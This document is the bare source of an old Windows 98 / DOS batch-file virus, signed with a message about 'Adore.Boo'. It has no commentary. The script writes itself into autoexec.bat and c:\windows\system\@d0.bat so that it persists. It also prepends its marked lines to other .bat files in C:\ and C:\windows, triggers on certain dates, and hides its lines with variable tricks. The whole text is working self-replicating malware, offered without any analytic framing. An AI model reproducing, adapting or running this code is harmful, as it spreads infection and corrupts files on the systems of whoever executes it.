   @echo off%@d0b0O%
   %@d0%if not exist %0 set pup=%0.bat|if not exist %0.bat set pup=%0
   echo.|date|find "08"|if errorlevel 1 goto @d0_8
   echo.|date|find "28"|if errorlevel 1 goto @d0_8
   if not exist c:\windows\system\@d0.bat goto @d0_13
   :@d0_1b0O
   if not exist c:\autoexec.bat goto @d0_2b0O
   if exist c:\autoexec.bat goto @d0_3b0O
   :@d0_2b0O
   %@d0b0O%echo.>c:\autoexec.bat
   goto @d0_1b0O
   :@d0_3b0O
   if not exist c:\b0O goto @d0_4b0O
   if exist c:\b0O goto @d0_5b0O
   :@d0_4b0O
   %@d0%copy c:\autoexec.bat c:\b0O>nul
   goto @d0_3b0O
   :@d0_5b0O
   if c:\autoexec.bat==%0 goto @d0_6b0O
   %@d0%find "b0O"<%pup%>c:\autoexec.bat
   %@d0%set pup=
   %@d0%c:\autoexec.bat
   :@d0_6b0O
   if unbuuh==%1 goto @d0_7b0O
   %@d0b0O%for %%a in (c:\*.bat c:\windows\*.bat) do call c:\autoexec.bat unbuuh %%a
   %b0O%del c:\windows\system\@d0.bat
   %@d0b0O%echo Hey,Adore.Boo is the cutest puppy in the world.
   %@d0%move /y c:\b0O c:\autoexec.bat>nul |set cmdline=
   :@d0_7b0O
   %b0O%find "@d0"<%2>nul
   if errorlevel 1 goto @d0b0Ox
   if c:\AUTOEXEC.BAT==%2 goto @d0b0Ox
   %b0O%find /v "@d0"<%2>c:\pupi
   %@d0b0O%type c:\pupi>%2
   %@d0b0O%del c:\pupi
   :@d0b0Ox
   :@d0_8
   ver|find "Windows 98"|if errorlevel 1 goto @d0_13
   if not exist c:\windows\system\msconfig.exe goto @d0_13
   if buuh==%1 goto @d0_12
   :@d0_9
   if exist c:\windows\system\@d0.bat goto @d0_11
   if not exist c:\windows\system\@d0.bat goto @d0_10
   :@d0_10
   find "@d0"<%pup%>c:\windows\system\@d0.bat
   goto @d0_9
   :@d0_11
   for %%b in (c:\*.bat c:\windows\*.bat) do call c:\windows\system\@d0.bat buuh %%b
   goto @d0_13
   :@d0_12
   if c:\AUTOEXEC.BAT==%2 goto @d0_13
   find "@d0"<%2>nul
   if not errorlevel 1 goto @d0_13
   type %2>c:\@d0
   type c:\windows\system\@d0.bat>%2
   type c:\@d0>>%2
   del c:\@d0
   :@d0_13
   %@d0%set pup=|set cmdline=
